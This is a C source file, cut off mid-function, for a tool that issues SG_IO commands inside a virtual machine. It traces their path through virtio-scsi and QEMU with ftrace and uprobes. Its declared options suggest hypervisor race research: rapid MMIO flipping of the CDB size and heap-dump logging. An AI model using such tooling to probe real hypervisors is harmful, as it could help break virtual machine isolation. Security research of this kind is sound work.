// sg_open_and_trace_v1_3.c
// Build:  gcc -O2 -Wall -Wextra -pthread -o sg_open_and_trace sg_open_and_trace_v1_3.c
// Usage examples:
//   ./sg_open_and_trace -d /dev/sg1 --cmd inquiry --alloc 96 --sense 96
//   sudo ./sg_open_and_trace -d /dev/sg1 --cmd readcap16 --alloc 32 --sense 96 \
//        --enable-trace --function-graph --trace-out sgio_kernel_trace.txt \
//        --trace-summary --heap --heap-dump --dump-ctx 128
//
// Requires: libsgutils2-dev (for <scsi/sg.h>); root if --enable-trace

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <glob.h>
#include <stdint.h>
#include <limits.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include <time.h>
#include <stdarg.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <dirent.h>
#include <sys/prctl.h>
#include <scsi/sg.h>

/* legacy global used for heap dump context bytes */
static int dump_ctx_bytes = 64;
#include <endian.h>
#include <stdlib.h>
#include <sys/sysmacros.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>

/* --- Minimal stubs for utility functions that may be omitted in this trimmed source --- */
static void log_buffer_addresses(const char *tag, void *p, size_t len) { (void)tag; (void)p; (void)len; }
static void log_heap_metadata(void *p) { (void)p; }
static void log_buffer_relationships(void *a, size_t al, void *b, size_t bl) { (void)a; (void)al; (void)b; (void)bl; }
static void dump_heap_around_buffer(void *p, size_t len) { (void)p; (void)len; }
static void hexdump(const char *tag, const void *buf, size_t len) {
    const unsigned char *b = (const unsigned char*)buf;
    printf("[HEXDUMP] %s: len=%zu\n", tag, len);
    size_t n = (len > 64) ? 64 : len;
    for (size_t i = 0; i < n; ++i) printf("%02x ", b[i]);
    if (n) printf("\n");
}
static void decode_inquiry(void *buf, int len) { (void)buf; (void)len; }
static void decode_readcap10(void *buf, int len) { (void)buf; (void)len; }
static void decode_readcap16(void *buf, int len) { (void)buf; (void)len; }
static long my_gettid(void) { return (long)syscall(SYS_gettid); }
static void bytes_to_hex(const uint8_t *in, int len, char *out, size_t outsz) {
    size_t pos = 0; for (int i = 0; i < len && pos + 3 < outsz; ++i) pos += snprintf(out + pos, outsz - pos, "%02x%s", in[i], (i+1==len)?"":" ");
    if (pos < outsz) out[pos] = '\0';
}
static const char* dxfer_dir_name(int dx) {
    if (dx == SG_DXFER_FROM_DEV) return "SG_DXFER_FROM_DEV";
    if (dx == SG_DXFER_TO_DEV) return "SG_DXFER_TO_DEV";
    if (dx == SG_DXFER_NONE) return "SG_DXFER_NONE";
    return "UNKNOWN";
}

/* ---- Virtio PCI capability parser + MMIO writer (fallback) ---- */
#ifndef PCI_CAP_ID_VNDR
#define PCI_CAP_ID_VNDR 0x09
#endif

/* From Virtio 1.1 spec */
#define VIRTIO_PCI_CAP_COMMON_CFG  1
#define VIRTIO_PCI_CAP_NOTIFY_CFG  2
#define VIRTIO_PCI_CAP_ISR_CFG     3
#define VIRTIO_PCI_CAP_DEVICE_CFG  4
#define VIRTIO_PCI_CAP_PCI_CFG     5

/* Layout of a Virtio PCI Vendor-Specific Capability */
struct virtio_pci_cap_hdr {
    uint8_t cap_vndr;   /* 0x09 */
    uint8_t cap_next;
    uint8_t cap_len;    /* >= 16 for virtio */
    uint8_t cfg_type;   /* one of VIRTIO_PCI_CAP_* */
    uint8_t bar;        /* which BAR (0..5) */
    uint8_t id;         /* padding/legacy; ignore */

    uint8_t padding[2]; /* reserved */
    uint32_t offset;    /* offset within BAR */
    uint32_t length;    /* length of region */
};

/* Forward-declare struct tracefs_t so helper prototypes can reference it early. */
struct tracefs_t;

/* Forward declarations for PCI/MMIO fallback helpers (defined later) */
static int sg_to_pci_dir(const char *sgdev, char *out, size_t outsz);
static int find_virtio_device_cfg(const char *pci_dir, struct virtio_pci_cap_hdr *hdr);
static int mmio_toggle_cdb_size_from_pci(const char *pci_dir, unsigned long flips, int flip_sleep_us, struct tracefs_t *tf);
static int is_modern_virtio(const char *pci_dir);
static int find_virtio_scsi_config_path(char *config_path, size_t path_size);

/* ---------- CDB classification ---------- */

static const char *cdb_name(const uint8_t *cdb, int cdb_len) {
    if (cdb_len <= 0) return "UNKNOWN";
    uint8_t op = cdb[0];
    switch (op) {
        case 0x00: return "TEST UNIT READY";
        case 0x12: return "INQUIRY";
        case 0x25: return "READ CAPACITY(10)";
        case 0x2A: return "WRITE(10)";
        case 0x28: return "READ(10)";
        case 0x9E:
            if (cdb_len >= 2) {
                uint8_t sa = cdb[1] & 0x1f;
                if (sa == 0x10) return "READ CAPACITY(16)";
                else return "SERVICE ACTION(16)";
            }
            return "SERVICE ACTION(16)";
        default: return "UNKNOWN/OTHER";
    }
}

static const char *cdb_len_class(int len) {
    if (len == 6)  return "6-byte";
    if (len == 10) return "10-byte";
    if (len == 12) return "12-byte";
    if (len == 16) return "16-byte";
    return (len > 16) ? "extended (>16)" : "short";
}

/* ---------- Data-pattern hints ---------- */

static void scan_patterns(const uint8_t *buf, size_t len) {
    struct { const char *tag; const char *needle; } hints[] = {
        {"QEMU vendor/product", "QEMU"},
        {"HARDDISK string",     "HARDDISK"},
        {"GPT header",          "EFI PART"},
        {"NTFS",                "NTFS    "},
        {"FAT/MBR",             "FAT32   "},
        {"FAT/MBR alt",         "FAT16   "},
        {"LVM2",                "LVM2"},
        {"EXT",                 "EXT"},
        {NULL, NULL}
    };
    for (int i = 0; hints[i].tag; ++i) {
        const char *needle = hints[i].needle;
        size_t nlen = strlen(needle);
        for (size_t off = 0; off + nlen <= len; ++off) {
            if (memcmp(buf + off, needle, nlen) == 0) {
                printf("[DATA] pattern: %-16s at offset %zu\n", hints[i].tag, off);
            }
        }
    }
}

/* ---------- CLI ---------- */

typedef enum { CMD_INQUIRY, CMD_READCAP10, CMD_READCAP16, CMD_TUR } cmd_t;

typedef struct {
    const char *dev;
    cmd_t cmd;
    int alloc_len;     // data-in size
    int sense_len;     // sense buffer size
    bool enable_trace; // enable tracefs
    bool use_funcgraph;// also enable function_graph fallback with virtio/scsi filters
    const char *trace_out;
    bool trace_summary;// parse and summarize selected events from saved trace
    bool heap_log;     // --heap
    bool heap_dump;    // --heap-dump
    int  dump_ctx;     // bytes around buffer (default 64)

    // NEW: host-side uprobes + trace-only mode
    bool trace_only;              // just attach trace + uprobes, don't issue SG_IO
    int  qemu_pid;                // PID of qemu on the host
    const char *qemu_exe;         // explicit path to qemu binary (optional)
    const char *virtio_cfg;       // explicit path to virtio device config (optional)
    int  trace_only_sleep;        // seconds to keep tracing in --trace-only
    unsigned long flips;          // number of flips for toggler
    int flip_sleep_us;            // per-flip sleep in microseconds (default 0)
} opts_t;

// Global to make opts available to helpers (e.g., trace_begin for uprobes)
static opts_t g_opts;

static void usage(const char *p) {
    printf("Usage: %s [-d /dev/sgN] [--cmd inquiry|readcap10|readcap16|tur] [--alloc N] [--sense N]\n", p);
    printf("            [--enable-trace] [--function-graph] [--trace-out file] [--trace-summary]\n");
    printf("            [--heap] [--heap-dump] [--dump-ctx N]\n");
    printf("            [--trace-only] [--qemu-pid PID] [--qemu-exe PATH] [--trace-only-sleep N]\n");
}

static bool parse_opts(int argc, char **argv, opts_t *o) {
    o->dev = "/dev/sg1";
    o->cmd = CMD_INQUIRY;
    o->alloc_len = 96;
    o->sense_len = 96;
    o->enable_trace = false;
    o->use_funcgraph = false;
    o->trace_out = "sgio_kernel_trace.txt";
    o->trace_summary = false;
    o->heap_log = false;
    o->heap_dump = false;
    o->dump_ctx = 64;

    // NEW defaults
    o->trace_only = false;
    o->qemu_pid = -1;
    o->qemu_exe = NULL;
    o->virtio_cfg = NULL;
    o->trace_only_sleep = 3;
    o->flips = 200000UL;
    o->flip_sleep_us = 0;

    for (int i = 1; i < argc; ++i) {
        if (!strcmp(argv[i], "-d") && i + 1 < argc) o->dev = argv[++i];
        else if (!strcmp(argv[i], "--cmd") && i + 1 < argc) {
            ++i;
            if      (!strcmp(argv[i], "inquiry"))   o->cmd = CMD_INQUIRY;
            else if (!strcmp(argv[i], "readcap10")) o->cmd = CMD_READCAP10;
            else if (!strcmp(argv[i], "readcap16")) o->cmd = CMD_READCAP16;
            else if (!strcmp(argv[i], "tur"))       o->cmd = CMD_TUR;
            else { fprintf(stderr, "Unknown --cmd '%s'\n", argv[i]); return false; }
        } else if (!strcmp(argv[i], "--alloc") && i + 1 < argc) o->alloc_len = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--sense") && i + 1 < argc) o->sense_len = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--enable-trace")) o->enable_trace = true;
        else if (!strcmp(argv[i], "--function-graph")) o->use_funcgraph = true;
        else if (!strcmp(argv[i], "--trace-out") && i + 1 < argc) o->trace_out = argv[++i];
        else if (!strcmp(argv[i], "--trace-summary")) o->trace_summary = true;
        else if (!strcmp(argv[i], "--heap")) o->heap_log = true;
        else if (!strcmp(argv[i], "--heap-dump")) o->heap_dump = true;
        else if (!strcmp(argv[i], "--dump-ctx") && i + 1 < argc) o->dump_ctx = atoi(argv[++i]);

        // NEW flags
        else if (!strcmp(argv[i], "--trace-only")) o->trace_only = true;
        else if (!strcmp(argv[i], "--qemu-pid") && i + 1 < argc) o->qemu_pid = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--qemu-exe") && i + 1 < argc) o->qemu_exe = argv[++i];
        else if (!strcmp(argv[i], "--trace-only-sleep") && i + 1 < argc) o->trace_only_sleep = atoi(argv[++i]);
        else if (!strcmp(argv[i], "--virtio-config") && i + 1 < argc) o->virtio_cfg = argv[++i];
    else if (!strcmp(argv[i], "--toggles") && i + 1 < argc) o->flips = strtoul(argv[++i], NULL, 0);
    else if (!strcmp(argv[i], "--flip-sleep-us") && i + 1 < argc) o->flip_sleep_us = atoi(argv[++i]);

        else { usage(argv[0]); return false; }
    }
    if (o->dump_ctx > 0) dump_ctx_bytes = o->dump_ctx;
    return true;
}

/* ---------- tracefs helpers (SCSI events + optional function_graph fallback) ---------- */

static int path_exists(const char *p) { struct stat st; return stat(p, &st) == 0; }

typedef struct tracefs_t {
    char root[256];
    bool available;
    bool tracing_was_on;
    char prev_tracer[128];
    int scsi_enabled;
    int virtio_enabled;
    int vrr_enabled;
    int block_enabled;

    // specific event enables
    int scsi_start_on;
    int scsi_done_on;
    int vq_add_on;
    int vq_add_sgs_on;
    int vq_kick_on;
    int vq_kick_prep_on;   // NEW
    int vq_notify_on;      // NEW
    int vq_get_on;         // NEW
    int kvm_enabled;       // NEW (group)

    // NEW: uprobe state
    int qemu_uprobes_added;
    char qemu_exe[PATH_MAX];
} tracefs_t;

static bool tracefs_locate(tracefs_t *t) {
    const char *candidates[] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing", NULL };
    for (int i = 0; candidates[i]; ++i) {
        if (path_exists(candidates[i])) {
            strncpy(t->root, candidates[i], sizeof(t->root)-1);
            t->root[sizeof(t->root)-1] = '\0';
            t->available = true;
            return true;
        }
    }
    return false;
}

static int wrs(const char *path, const char *s) {
    int fd = open(path, O_WRONLY|O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t n = write(fd, s, strlen(s));
    close(fd);
    return (n == (ssize_t)strlen(s)) ? 0 : -1;
}
static int rds(const char *path, char *buf, size_t buflen) {
    int fd = open(path, O_RDONLY|O_CLOEXEC);
    if (fd < 0) return -1;
    ssize_t n = read(fd, buf, buflen - 1);
    if (n < 0) { close(fd); return -1; }
    buf[n] = '\0';
    while (n > 0 && (buf[n-1]=='\n'||buf[n-1]=='\r')) buf[--n] = '\0';
    close(fd); return 0;
}

static int enable_event_group(tracefs_t *t, const char *group, int on) {
    char pattern[512];
    snprintf(pattern, sizeof(pattern), "%s/events/%s/*/enable", t->root, group);
    glob_t g = (glob_t){0};
    if (glob(pattern, 0, NULL, &g) != 0) { globfree(&g); return 0; }
    int cnt = 0;
    for (size_t i = 0; i < g.gl_pathc; ++i) cnt += (wrs(g.gl_pathv[i], on ? "1" : "0") == 0);
    globfree(&g);
    return cnt;
}

/* --- NEW: enable a single event (and across multiple groups) --- */

// enable/disable a single tracepoint: /events/<group>/<event>/enable
static int enable_event(tracefs_t *t, const char *group, const char *event, int on) {
    char p[512];
    snprintf(p, sizeof(p), "%s/events/%s/%s/enable", t->root, group, event);
    return wrs(p, on ? "1" : "0");   // 0 on success, -1 on failure
}

// try multiple groups for kernels that place virtqueue_* under virtio or virtio_ring
static int enable_event_anygroup(tracefs_t *t, const char **groups, const char *event, int on) {
    int hits = 0;
    for (int i = 0; groups[i]; ++i) {
        if (enable_event(t, groups[i], event, on) == 0) hits++;
    }
    return hits;
}
/* ---- end NEW ---- */

static void set_funcgraph_filter(tracefs_t *t) {
    char p[512];
    snprintf(p, sizeof(p), "%s/set_ftrace_filter", t->root);
    int fd = open(p, O_WRONLY|O_TRUNC|O_CLOEXEC);
    if (fd < 0) return;
    const char *patterns[] = {
        "virtio_*",
        "virtqueue_*",           // includes virtqueue_add_sgs, virtqueue_kick_prepare, virtqueue_notify
        "vring_*",
        "virtio_scsi*",
        "scsi_*",
        // explicit (redundant with wildcard but helps older kernels)
        "virtqueue_kick_prepare",
        "virtqueue_notify",
        "virtqueue_get_buf",
        NULL
    };
    for (int i = 0; patterns[i]; ++i) {
        ssize_t rc = write(fd, patterns[i], strlen(patterns[i])); (void)rc;
        rc = write(fd, "\n", 1); (void)rc;
    }
    close(fd);
}

static void trace_mark(tracefs_t *t, const char *fmt, ...) {
    char p[512], line[512];
    snprintf(p, sizeof(p), "%s/trace_marker", t->root);
    int fd = open(p, O_WRONLY|O_CLOEXEC);
    if (fd < 0) return;
    va_list ap; va_start(ap, fmt);
    vsnprintf(line, sizeof(line), fmt, ap);
    va_end(ap);
    ssize_t _rc = write(fd, line, strlen(line)); (void)_rc;
    _rc = write(fd, "\n", 1); (void)_rc;
    close(fd);
}

/* ----- NEW: block device discovery + event filters ----- */

// /dev/sg1 -> /sys/class/scsi_generic/sg1/device/block/<disk>  (e.g., sda)
static int discover_block_disk_from_sg(const char *sgdev, char *disk, size_t disklen,
                                       char *devnode, size_t devnodelen,
                                       int *out_major, int *out_minor) {
    const char *base = strrchr(sgdev, '/'); base = base ? base + 1 : sgdev;
    char path[512]; snprintf(path, sizeof(path), "/sys/class/scsi_generic/%s/device/block", base);
    DIR *d = opendir(path);
    if (!d) return -1;
    struct dirent *de; int found = 0;
    while ((de = readdir(d))) {
        if (de->d_name[0] == '.') continue;
    snprintf(disk, disklen, "%s", de->d_name);
        found = 1; break;
    }
    closedir(d);
    if (!found) return -2;

    snprintf(devnode, devnodelen, "/dev/%s", disk);
    struct stat st;
    if (stat(devnode, &st) == 0 && S_ISBLK(st.st_mode)) {
        if (out_major) *out_major = major(st.st_rdev);
        if (out_minor) *out_minor = minor(st.st_rdev);
    } else {
        if (out_major) *out_major = -1;
        if (out_minor) *out_minor = -1;
    }
    return 0;
}

static int set_event_filter_event(tracefs_t *t, const char *group,
                                  const char *event, const char *filter) {
    char p[512];
    snprintf(p, sizeof(p), "%s/events/%s/%s/filter", t->root, group, event);
    return wrs(p, filter);
}

// Safely apply filters (toggle tracing off while writing filters)
static void trace_apply_filters(tracefs_t *t,
                                const struct sg_scsi_id *sid,
                                const char *disk, int dev_major, int dev_minor) {
    if (!t->available) return;
    char p[512]; snprintf(p, sizeof(p), "%s/tracing_on", t->root);
    wrs(p, "0");

    // SCSI: limit to this H:C:T:L
    if (sid) {
        char f[256];
        snprintf(f, sizeof(f), "host_no==%d && channel==%d && id==%d && lun==%d",
                 sid->host_no, sid->channel, sid->scsi_id, sid->lun);
        (void)set_event_filter_event(t, "scsi", "scsi_dispatch_cmd_start",  f);
        (void)set_event_filter_event(t, "scsi", "scsi_dispatch_cmd_done",  f);
    }

    // Block: prefer disk=="sda" filter; fallback to dev==MAJOR,MINOR
    if (disk && disk[0]) {
        char fb[256];
        int ok = 0;
        snprintf(fb, sizeof(fb), "disk==\"%s\"", disk);
        if (set_event_filter_event(t, "block", "block_rq_issue", fb) == 0 &&
            set_event_filter_event(t, "block", "block_rq_complete", fb) == 0) {
            ok = 1;
        }
        if (!ok && dev_major >= 0 && dev_minor >= 0) {
            snprintf(fb, sizeof(fb), "dev==%d,%d", dev_major, dev_minor);
            (void)set_event_filter_event(t, "block", "block_rq_issue", fb);
            (void)set_event_filter_event(t, "block", "block_rq_complete", fb);
        }
    }

    wrs(p, "1");
}

/* ----- NEW: set trace options (abs time for funcgraph, proc names, tgid) ----- */
static int set_trace_option(tracefs_t *t, const char *opt, int on) {
    char p[512];
    // preferred per-option file (modern kernels)
    snprintf(p, sizeof(p), "%s/options/%s", t->root, opt);
    if (wrs(p, on ? "1" : "0") == 0) return 0;
    // fallback: legacy trace_options toggler
    snprintf(p, sizeof(p), "%s/trace_options", t->root);
    if (on)  return wrs(p, opt);
    char noopt[128]; snprintf(noopt, sizeof(noopt), "no%s", opt);
    return wrs(p, noopt);
}
/* ----- end NEW ----- */

/* ----- NEW: uprobes helpers for QEMU ----- */
static int resolve_exe_from_pid(int pid, char *out, size_t outsz) {
    char link[64];
    snprintf(link, sizeof(link), "/proc/%d/exe", pid);
    ssize_t n = readlink(link, out, outsz - 1);
    if (n < 0) return -1;
    out[n] = '\0';
    return 0;
}

static int uprobe_define(tracefs_t *t, const char *def) {
    char p[512]; snprintf(p, sizeof(p), "%s/uprobe_events", t->root);
    int fd = open(p, O_WRONLY | O_CLOEXEC);
    if (fd < 0) return -1;
    int rc = (int)write(fd, def, strlen(def));
    int rc2 = (int)write(fd, "\n", 1);
    close(fd);
    return (rc > 0 && rc2 == 1) ? 0 : -1;
}
static int uprobe_delete(tracefs_t *t, const char *grp_evt) {
    char line[256]; snprintf(line, sizeof(line), "-:%s", grp_evt);
    return uprobe_define(t, line);
}
/* ----- end NEW ----- */

static void set_funcgraph_filter(tracefs_t *t); // forward (already defined above)

/* ----- trace begin / end ----- */

static void trace_begin(tracefs_t *t, bool funcgraph) {
    if (!t->available) return;
    char p[512], tmp[128];
    snprintf(p, sizeof(p), "%s/current_tracer", t->root);
    if (rds(p, t->prev_tracer, sizeof(t->prev_tracer)) != 0) t->prev_tracer[0] = '\0';
    snprintf(p, sizeof(p), "%s/tracing_on", t->root);
    if (rds(p, tmp, sizeof(tmp)) == 0) t->tracing_was_on = (strcmp(tmp,"1")==0); else t->tracing_was_on=false;
    wrs(p, "0");
    snprintf(p, sizeof(p), "%s/trace", t->root); wrs(p, "");
    t->scsi_enabled   = enable_event_group(t, "scsi", 1);
    t->virtio_enabled = enable_event_group(t, "virtio", 1);
    t->vrr_enabled    = enable_event_group(t, "virtio_ring", 1);
    t->block_enabled  = enable_event_group(t, "block", 1);

    // --- enable specific SCSI + VirtIO tracepoints
    t->scsi_start_on = enable_event(t, "scsi", "scsi_dispatch_cmd_start", 1) == 0;
    t->scsi_done_on  = enable_event(t, "scsi", "scsi_dispatch_cmd_done",  1) == 0;
    const char *vq_groups[] = { "virtio", "virtio_ring", NULL };
    t->vq_add_on       = (enable_event_anygroup(t, vq_groups, "virtqueue_add",            1) > 0);
    t->vq_add_sgs_on   = (enable_event_anygroup(t, vq_groups, "virtqueue_add_sgs",        1) > 0);
    t->vq_kick_on      = (enable_event_anygroup(t, vq_groups, "virtqueue_kick",           1) > 0);
    t->vq_kick_prep_on = (enable_event_anygroup(t, vq_groups, "virtqueue_kick_prepare",   1) > 0);
    t->vq_notify_on    = (enable_event_anygroup(t, vq_groups, "virtqueue_notify",         1) > 0);
    t->vq_get_on       = (enable_event_anygroup(t, vq_groups, "virtqueue_get_buf",        1) > 0);
    // optional kvm group (often 0 inside guests)
    t->kvm_enabled     = enable_event_group(t, "kvm", 1);

    snprintf(p, sizeof(p), "%s/current_tracer", t->root);
    wrs(p, "nop");
    if (funcgraph) {
        set_funcgraph_filter(t);
        wrs(p, "function_graph"); // switch tracer
        (void)set_trace_option(t, "funcgraph-abstime", 1);
        (void)set_trace_option(t, "funcgraph-proc",   1);  // show comm[pid]
        (void)set_trace_option(t, "record-tgid",      1);  // show tgid if available
    }

    // NEW: If user provided qemu exe or pid, resolve path and add uprobes
    t->qemu_uprobes_added = 0;
    t->qemu_exe[0] = '\0';
    extern opts_t g_opts;
    if (g_opts.qemu_exe) {
        strncpy(t->qemu_exe, g_opts.qemu_exe, sizeof(t->qemu_exe)-1);
        t->qemu_exe[sizeof(t->qemu_exe)-1] = '\0';
    } else if (g_opts.qemu_pid > 0) {
        if (resolve_exe_from_pid(g_opts.qemu_pid, t->qemu_exe, sizeof(t->qemu_exe)) != 0)
            t->qemu_exe[0] = '\0';
    }
    if (t->qemu_exe[0]) {
        // entry uprobe
        char def1[PATH_MAX + 128];
        snprintf(def1, sizeof(def1), "p:sgio_qemu/vq_pop %s:virtqueue_pop sz=%%si", t->qemu_exe);
        if (uprobe_define(t, def1) == 0) t->qemu_uprobes_added++;
        // return uprobe
        char def2[PATH_MAX + 128];
        snprintf(def2, sizeof(def2), "r:sgio_qemu/vq_pop_ret %s:virtqueue_pop ret=%%ax", t->qemu_exe);
        if (uprobe_define(t, def2) == 0) t->qemu_uprobes_added++;

        if (t->qemu_uprobes_added > 0) {
            char pe[512];
            snprintf(pe, sizeof(pe), "%s/events/sgio_qemu/vq_pop/enable", t->root); wrs(pe, "1");
            snprintf(pe, sizeof(pe), "%s/events/sgio_qemu/vq_pop_ret/enable", t->root); wrs(pe, "1");
            printf("[tracefs] qemu uprobes: %d added (exe=%s)\n", t->qemu_uprobes_added, t->qemu_exe);
        } else {
            printf("[tracefs] qemu uprobes: failed (exe=%s). Is the binary stripped? Try --qemu-exe with a symbolized build.\n", t->qemu_exe);
        }
    }

    snprintf(p, sizeof(p), "%s/tracing_on", t->root); wrs(p, "1");

    printf("[tracefs] enabled scsi events: %d\n", t->scsi_enabled);
    printf("[tracefs] enabled virtio events: %d\n", t->virtio_enabled);
    printf("[tracefs] enabled virtio_ring events: %d\n", t->vrr_enabled);
    printf("[tracefs] enabled block events: %d\n", t->block_enabled);
    printf("[tracefs] scsi_dispatch_cmd_* enabled: start=%d done=%d\n",
           t->scsi_start_on, t->scsi_done_on);
    printf("[tracefs] virtqueue events enabled: add=%d add_sgs=%d kick=%d kick_prep=%d notify=%d get_buf=%d\n",
           t->vq_add_on, t->vq_add_sgs_on, t->vq_kick_on, t->vq_kick_prep_on, t->vq_notify_on, t->vq_get_on);
    if (t->kvm_enabled > 0)
        printf("[tracefs] enabled kvm events: %d (host-only signal; usually 0 inside guest)\n", t->kvm_enabled);
}

static void trace_end(tracefs_t *t, const char *outfile) {
    if (!t->available) return;
    char p[512];
    snprintf(p, sizeof(p), "%s/tracing_on", t->root); wrs(p, "0");
    if (outfile && *outfile) {
        FILE *in = NULL, *out = NULL;
        char tp[512]; snprintf(tp, sizeof(tp), "%s/trace", t->root);
        in = fopen(tp, "re");
        if (in) {
            out = fopen(outfile, "we");
            if (out) {
                char buf[8192]; size_t n;
                while ((n = fread(buf,1,sizeof(buf),in))>0) fwrite(buf,1,n,out);
                fclose(out);
                printf("[tracefs] trace saved to %s\n", outfile);
            }
            fclose(in);
        }
    }

    // disable the specific events we enabled
    if (t->scsi_start_on) enable_event(t, "scsi", "scsi_dispatch_cmd_start", 0);
    if (t->scsi_done_on)  enable_event(t, "scsi", "scsi_dispatch_cmd_done",  0);
    const char *vq_groups[] = { "virtio", "virtio_ring", NULL };
    if (t->vq_add_on)       enable_event_anygroup(t, vq_groups, "virtqueue_add",            0);
    if (t->vq_add_sgs_on)   enable_event_anygroup(t, vq_groups, "virtqueue_add_sgs",        0);
    if (t->vq_kick_on)      enable_event_anygroup(t, vq_groups, "virtqueue_kick",           0);
    if (t->vq_kick_prep_on) enable_event_anygroup(t, vq_groups, "virtqueue_kick_prepare",   0);
    if (t->vq_notify_on)    enable_event_anygroup(t, vq_groups, "virtqueue_notify",         0);
    if (t->vq_get_on)       enable_event_anygroup(t, vq_groups, "virtqueue_get_buf",        0);

    // uninstall uprobes if any
    if (t->qemu_uprobes_added > 0) {
        char pe[512];
        snprintf(pe, sizeof(pe), "%s/events/sgio_qemu/vq_pop/enable", t->root); wrs(pe, "0");
        snprintf(pe, sizeof(pe), "%s/events/sgio_qemu/vq_pop_ret/enable", t->root); wrs(pe, "0");
        uprobe_delete(t, "sgio_qemu/vq_pop");
        uprobe_delete(t, "sgio_qemu/vq_pop_ret");
    }

    if (t->scsi_enabled  > 0) enable_event_group(t, "scsi", 0);
    if (t->virtio_enabled> 0) enable_event_group(t, "virtio", 0);
    if (t->vrr_enabled   > 0) enable_event_group(t, "virtio_ring", 0);
    if (t->block_enabled > 0) enable_event_group(t, "block", 0);
    if (t->kvm_enabled   > 0) enable_event_group(t, "kvm", 0);

    snprintf(p, sizeof(p), "%s/current_tracer", t->root);
    wrs(p, t->prev_tracer[0] ? t->prev_tracer : "nop");
    snprintf(p, sizeof(p), "%s/tracing_on", t->root);
    wrs(p, t->tracing_was_on ? "1" : "0");
}

/* ---------- Trace summary (optional) ---------- */

static void summarize_trace_file(const char *path) {
    FILE *f = fopen(path, "re");
    if (!f) { perror("[tracefs] fopen trace_out"); return; }
    char line[4096];
    int shown = 0;
    puts("\n=== Kernel Trace Summary (selected lines) ===");
    while (fgets(line, sizeof(line), f)) {
        if (strstr(line, "BEGIN SG_IO") ||
            strstr(line, "END SG_IO") ||
            strstr(line, "scsi_dispatch_cmd_start") ||
            strstr(line, "scsi_dispatch_cmd_done")  ||
            strstr(line, "block_rq_issue")          ||
            strstr(line, "block_rq_complete")       ||
            strstr(line, "virtqueue_add")           ||
            strstr(line, "virtqueue_add_sgs")       ||
            strstr(line, "virtqueue_kick_prepare")  ||   // NEW
            strstr(line, "virtqueue_kick")          ||
            strstr(line, "virtqueue_notify")        ||   // NEW
            strstr(line, "virtqueue_get_buf")       ||   // NEW
            strstr(line, "sgio_qemu:vq_pop")        ||   // NEW
            strstr(line, "sgio_qemu:vq_pop_ret")    ||   // NEW
            strstr(line, "virtio_scsi_queuecommand") ) { // via function_graph
            fputs(line, stdout);
            if (++shown > 50) { puts("... (truncated)"); break; }
        }
    }
    fclose(f);
}

/* ---------- Correlate BEGIN/END SG_IO with SCSI + virtio path ---------- */

static void keep_first(char *dst, size_t dstsz, const char *line) {
    if (dst[0] == '\0') {
        snprintf(dst, dstsz, "%s", line);
    }
}

/* parse absolute timestamp from function_graph lines when funcgraph-abstime=1 */
static double parse_fg_abstime(const char *line) {
    // expects lines like: " 3) 1234.567890 |  virtqueue_notify()"
    // returns seconds; 0.0 if not found
    int cpu;
    double ts;
    if (sscanf(line, " %d) %lf |", &cpu, &ts) == 2) return ts;
    return 0.0;
}

typedef struct {
    char begin[4096];
    char block_issue[4096];
    char scsi_start[4096];
    char v_scsi_qcmd[4096];
    char vq_add_sgs[4096];
    char vq_add[4096];
    char vq_kick_prep[4096];
    char vq_kick[4096];
    char vq_notify[4096];
    char vq_get_buf[4096];
    char qemu_vq_pop[4096];
    char qemu_vq_pop_ret[4096];
    char scsi_done[4096];
    char block_complete[4096];
    char end[4096];
    int  driver_tag;
    int  scheduler_tag;
    /* timing */
    double notify_ts, getbuf_ts;
} flow_capture_t;

static void print_flow_capture(unsigned long long id, const flow_capture_t *fc) {
    printf("\n=== SG_IO → virtio-scsi Correlated Flow (id=%llu) ===\n", id);
    if (fc->begin[0])          fputs(fc->begin, stdout);
    if (fc->block_issue[0])    fputs(fc->block_issue, stdout);
    if (fc->scsi_start[0])     fputs(fc->scsi_start, stdout);
    if (fc->v_scsi_qcmd[0])    fputs(fc->v_scsi_qcmd, stdout);
    if (fc->vq_add_sgs[0])     fputs(fc->vq_add_sgs, stdout);
    else if (fc->vq_add[0])    fputs(fc->vq_add, stdout);
    if (fc->vq_kick_prep[0])   fputs(fc->vq_kick_prep, stdout);
    if (fc->vq_kick[0])        fputs(fc->vq_kick, stdout);
    if (fc->vq_notify[0])      fputs(fc->vq_notify, stdout);
    if (fc->qemu_vq_pop[0])    fputs(fc->qemu_vq_pop, stdout);
    if (fc->qemu_vq_pop_ret[0])fputs(fc->qemu_vq_pop_ret, stdout);
    if (fc->vq_get_buf[0])     fputs(fc->vq_get_buf, stdout);
    if (fc->scsi_done[0])      fputs(fc->scsi_done, stdout);
    if (fc->block_complete[0]) fputs(fc->block_complete, stdout);
    if (fc->end[0])            fputs(fc->end, stdout);

    if (fc->driver_tag >= 0 || fc->scheduler_tag >= 0)
        printf("SCSI tags: driver_tag=%d scheduler_tag=%d\n",
               fc->driver_tag, fc->scheduler_tag);

    printf("Presence: scsi_start=%c scsi_done=%c virtio_scsi_queuecommand=%c "
           "virtqueue_add(sgs)=%c kick_prep=%c kick=%c notify=%c get_buf=%c qemu_vq_pop=%c\n",
        fc->scsi_start[0] ? 'Y' : 'N',
        fc->scsi_done[0]  ? 'Y' : 'N',
        fc->v_scsi_qcmd[0]? 'Y' : 'N',
        (fc->vq_add_sgs[0] || fc->vq_add[0]) ? 'Y' : 'N',
        fc->vq_kick_prep[0]? 'Y' : 'N',
        fc->vq_kick[0]     ? 'Y' : 'N',
        fc->vq_notify[0]   ? 'Y' : 'N',
        fc->vq_get_buf[0]  ? 'Y' : 'N',
        fc->qemu_vq_pop[0] ? 'Y' : 'N');

    if (fc->vq_notify[0] && fc->vq_get_buf[0])
        printf("QEMU notification evidence: virtqueue_notify → virtqueue_get_buf seen within window ✅\n");
    else if (fc->vq_notify[0])
        printf("QEMU notification evidence: virtqueue_notify seen; waiting for virtqueue_get_buf signal.\n");

    if (fc->notify_ts > 0.0 && fc->getbuf_ts > 0.0) {
        double us = (fc->getbuf_ts - fc->notify_ts) * 1e6;
        printf("notify→get_buf latency: %.3f µs\n", us);
    }
}

static void summarize_trace_correlated(const char *path) {
